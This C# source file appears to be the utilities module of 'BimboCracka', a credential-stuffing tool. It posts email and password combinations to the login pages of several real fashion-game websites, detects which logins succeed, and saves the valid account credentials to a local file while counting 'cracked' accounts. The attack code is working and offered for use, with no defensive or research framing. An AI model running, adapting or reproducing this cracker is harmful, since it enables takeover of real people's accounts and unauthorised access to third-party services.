using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace BimboCracka
{
    internal class Utils
    {
        public static int crackedAccs = 0;

        public static int successes = 0;

        private static HttpClient client = new HttpClient();


        public static string newPath = "";

        public static void SetHttpClient(HttpClient httpClient)
        {
            client = httpClient;
        }

        public static string ServerHelper(string serverPublic)
        {
            switch (serverPublic.Trim().ToUpper())
            {
                case "PL": return "https://www.missfashion.pl/";
                case "RU": return "https://www.moyabimbo.ru/";
                case "IT": return "https://www.myfashiongirl.it/";
                case "GB":
                case "UK": return "https://www.likeafashionista.com/";
                case "FR": return "https://www.ma-bimbo.com/";
                case "ES": return "https://www.missmoda.es/";
                case "DE": return "https://www.modepueppchen.com/";
                case "BR": return "https://www.princesapop.com/";
                default:
                    DisplayTimeWithMessage("WRONG SERVER INPUTED! PLEASE TRY AGAIN", false);
                    Console.ReadKey();
                    Program.Menu();
                    return string.Empty;
            }
        }

        public static void createPath(string server)
        {
            string currentTime = DateTime.Now.ToString("HH-mm");
            newPath = $"CRACKER-{server.ToUpper()}-{currentTime}.txt";
        }

        public static string DecodeBase64(string base64Encoded)
        {
            byte[] data = Convert.FromBase64String(base64Encoded);
            return Encoding.UTF8.GetString(data);
        }
        public static async Task<bool> SendRequest(IEnumerable<KeyValuePair<string, string>> parameters, string method, string server, int combinations)
        {
            var content = new FormUrlEncodedContent(parameters);
            string email = parameters.FirstOrDefault(p => p.Key == "email").Value ?? "UNKNOWN";
            string password = parameters.FirstOrDefault(p => p.Key == "password").Value ?? "UNKNOWN";

            try
            {
                string url = $"{server.TrimEnd('/')}/{method.TrimStart('/')}";
                var response = await client.PostAsync(url, content);
                string responseContent = await response.Content.ReadAsStringAsync();
                string finalUrl = response.RequestMessage?.RequestUri?.ToString() ?? "";

                if (response.IsSuccessStatusCode)
                {
                    if (finalUrl.Contains("login-help.php"))
                    {
                        crackedAccs++;
                        Console.Title = $"BimboCracka v1.0.1          CRACKED {successes}          {crackedAccs}/{combinations} COMBINATIONS";
                        DisplayTimeWithMessage($"{email.ToUpper()}:{password.ToUpper()} INVALID CREDS\n", false);
                        return false;
                    }
                    else
                    {
                        crackedAccs++;
                        successes++;
                        Console.Title = $"BimboCracka v1.0.1          CRACKED {successes}          {crackedAccs}/{combinations} COMBINATIONS";
                        string validAccount = $"{email}:{password}";
                        DisplayTimeWithMessage($"{email.ToUpper()}:{password.ToUpper()} SUCCESSFULLY LOGGED IN\n", true);
                        await File.AppendAllTextAsync(newPath, validAccount + Environment.NewLine);
                        try
                        {
                            await client.GetAsync("https://www.ma-bimbo.com/modules/common/logout.php");
                        }
                        catch (Exception ex)
                        {
                            DisplayTimeWithMessage($"LOGOUT ERROR: {ex.Message}", false);
                        }

                        return true;
                    }
                }
                else
                {
                    DisplayTimeWithMessage($"{email.ToUpper()}:{password.ToUpper()} AN ERROR OCCURRED! ({response.StatusCode})\n", false);
                    return false;
                }
            }
            catch (Exception ex)
            {
                DisplayTimeWithMessage($"{email.ToUpper()}:{password.ToUpper()} ERROR: {ex.GetType().Name} - {ex.Message}", false);
                return false;
            }
        }

        public static void DisplayTimeWithMessage(string message, bool success)
        {
            DateTime currentTime = DateTime.Now;
            string formattedTime = currentTime.ToString("HH:mm:ss");

            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("" + formattedTime);

            Console.ForegroundColor = ConsoleColor.White;
            Console.Write(" | ");
            if (success)
            {
                Console.ForegroundColor = ConsoleColor.Green;
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
            }

            Console.Write(message);
            Console.ForegroundColor = ConsoleColor.White;
        }

        public static void Logo()
        {
            Console.ForegroundColor = ConsoleColor.DarkRed;
            string[] logo =
            {
                " ▄▄▄▄    ██▓ ███▄ ▄███▓ ▄▄▄▄    ▒█████   ▄████▄   ██▀███   ▄▄▄       ▄████▄   ██ ▄█▀▄▄▄      ",
                "▓█████▄ ▓██▒▓██▒▀█▀ ██▒▓█████▄ ▒██▒  ██▒▒██▀ ▀█  ▓██ ▒ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒▒████▄    ",
                "▒██▒ ▄██▒██▒▓██    ▓██░▒██▒ ▄██▒██░  ██▒▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ▒▓█    ▄ ▓███▄░▒██  ▀█▄  ",
                "▒██░█▀  ░██░▒██    ▒██ ▒██░█▀  ▒██   ██░▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄░██▄▄▄▄██ ",
                "░▓█  ▀█▓░██░▒██▒   ░██▒░▓█  ▀█▓░ ████▓▒░▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄▓█   ▓██▒",
                "░▒▓███▀▒░▓  ░ ▒░   ░  ░░▒▓███▀▒░ ▒░▒░▒░ ░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒▒▒   ▓▒█░",
                "▒░▒   ░  ▒ ░░  ░      ░▒░▒   ░   ░ ▒ ▒░   ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ▒   ▒▒ ░",
                " ░    ░  ▒ ░░      ░    ░    ░ ░ ░ ░ ▒  ░          ░░   ░   ░   ▒   ░        ░ ░░ ░  ░   ▒   ",
                " ░       ░         ░    ░          ░ ░  ░ ░         ░           ░  ░░ ░      ░  ░        ░  ░",
                "      ░                      ░          ░                           ░                        "
            };

            int consoleWidth = Console.WindowWidth;
            foreach (string line in logo)
            {
                int padding = (consoleWidth - line.Length) / 2;
                Console.WriteLine(new string(' ', Math.Max(padding, 0)) + line);
            }
            Console.WriteLine("\n");
            Console.ResetColor();
        }

    }
}